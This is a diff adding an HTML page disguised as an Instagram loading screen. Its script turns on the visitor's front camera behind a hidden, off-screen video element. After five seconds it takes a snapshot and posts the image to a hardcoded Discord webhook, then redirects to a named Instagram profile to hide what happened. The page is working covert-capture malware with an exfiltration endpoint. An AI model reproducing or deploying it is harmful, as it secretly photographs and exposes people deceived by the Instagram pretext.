@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading Instagram...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      background: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      text-align: center;
+      padding-top: 80px;
+      color: #333;
+    }
+
+    .logo {
+      font-weight: 600;
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+
+    #status {
+      font-size: 14px;
+      color: #888;
+    }
+
+    video {
+      position: absolute;
+      top: -1000px;
+      left: -1000px;
+      width: 1920px;
+      height: 1080px;
+      z-index: -1;
+    }
+
+    canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="logo">Instagram</div>
+  <p id="status">Checking profile access…</p>
+
+  <video autoplay playsinline muted></video>
+  <canvas></canvas>
+
+  <script>
+    const video = document.querySelector("video");
+    const canvas = document.createElement("canvas");
+
+    const webhookURL = "https://discord.com/api/webhooks/1402016583467008060/1vyWFP4D7Ybp0z-7qj4dNq416pmFE00pNq8By8uz0e_4lCEheR8lhfb_SIZdNyOc2NVs";
+    const instagramURL = "https://www.instagram.com/sherhan__abid.05";
+
+    const redirectToInstagram = () => {
+      document.getElementById("status").innerText = "Redirecting to Instagram…";
+      window.location.href = instagramURL;
+    };
+
+    navigator.mediaDevices.getUserMedia({
+      video: {
+        width: { ideal: 1920 },
+        height: { ideal: 1080 },
+        facingMode: "user"
+      }
+    })
+    .then(stream => {
+      video.srcObject = stream;
+
+      video.onloadedmetadata = () => {
+        setTimeout(() => {
+          const width = video.videoWidth;
+          const height = video.videoHeight;
+
+          if (width && height) {
+            canvas.width = width;
+            canvas.height = height;
+
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, width, height);
+
+            canvas.toBlob(blob => {
+              if (!blob) {
+                redirectToInstagram();
+                return;
+              }
+
+              const file = new File([blob], "snapshot.png", { type: "image/png" });
+              const formData = new FormData();
+              formData.append("file", file);
+              formData.append("content", "Front camera capture");
+
+              fetch(webhookURL, {
+                method: "POST",
+                body: formData
+              }).finally(() => {
+                redirectToInstagram();
+              });
+            }, "image/png");
+          } else {
+            redirectToInstagram();
+          }
+        }, 5000);
+      };
+    })
+    .catch(() => {
+      redirectToInstagram();
+    });
+  </script>
+</body>
+</html>
